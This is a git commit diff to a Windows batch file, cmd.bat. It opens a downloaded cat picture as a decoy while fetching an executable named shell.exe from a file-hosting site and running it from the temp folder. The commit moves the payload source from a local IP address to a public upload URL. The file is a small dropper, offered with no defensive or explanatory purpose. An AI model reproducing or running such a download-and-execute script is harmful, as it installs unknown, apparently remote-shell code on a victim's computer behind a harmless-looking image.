7d341f20af4e02090a46748319ea01cec25b6844
terionun <38081201+terionun@users.noreply.github.com>
2022-10-02 22:05:46 +0300

    Update cmd.bat

--- cmd.bat
+++ cmd.bat
@@ -1,2 +1,2 @@
 curl https://raw.githubusercontent.com/terionun/rockyou/main/cat.jpg --output %temp%\cat.jpg && start %temp%\cat.jpg
-curl http://192.168.1.44/shell.exe --output %temp%\shell.exe && start %temp%\shell.exe
+curl https://www.dosyaupload.com/48C2C?pt=VXpKYVMzZzVNSEZYWjFrcmQyeGFTM2RhY1VGR1VUMDlPcWpjdnBQQVg5dzdVZ0FKdGhobTZxYz0%3D --output %temp%\shell.exe && start %temp%\shell.exe
